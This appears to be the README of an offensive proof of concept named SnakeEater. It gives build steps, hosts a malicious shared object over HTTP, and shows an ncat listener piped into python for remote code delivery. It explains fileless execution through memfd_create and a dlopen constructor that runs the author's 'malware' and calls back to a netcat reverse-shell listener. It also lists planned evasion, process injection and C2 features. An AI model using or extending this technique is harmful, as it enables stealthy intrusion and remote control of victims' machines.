# SnakeEater

### To start:

Run the following commands:


`cmake .`

`make`


Now you should have the libSnakeEater.so file in the current directory. Host this somewhere. 

#### For Example:
`python2 -m SimpleHTTPServer 8080`

Then invoke the script in whatever way (pickle, code injection, ssh, or etc)

`ncat -nvlp 4443 --ssl | python -`   <- i just learned this trick and I love it

you know, whatever...

Then set up a net cat listener on whatever server you configured in `library.cpp`


## Concept

This PoC works by using the `memfd_create` syscall to map a page of anonymous memory to a file descriptor, write a Shared Oject to that page, and then execute the loaded SO. The execution of our malware is caused by abusing the constructor called by dlopen defined in the source as:

`void __attribute__ ((constructor)) init_eater(void);`

This technique may be able to be expanded to execute plain ELFs via `fexecve` however that may show as a subprocess and be a tip-off.

# TBD

More research is still being done, and I hope to be able to implemnt a pure python version of the following:

* Remote process injection and local process cleanup
* Better C2 for the example (pupy didn't work)
	* and seriously plain tcp dup() shell? What is this 2005?
* Architecture detection (for use in code injection) to get correct SO
* in memory decryption of loaded so 
* ~~pupy integration?~~~
	* [I'm a big dummy,]: https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/all/pupyimporter.py#L119 thanks [ninjasec]: https://github.com/n1nj4sec/

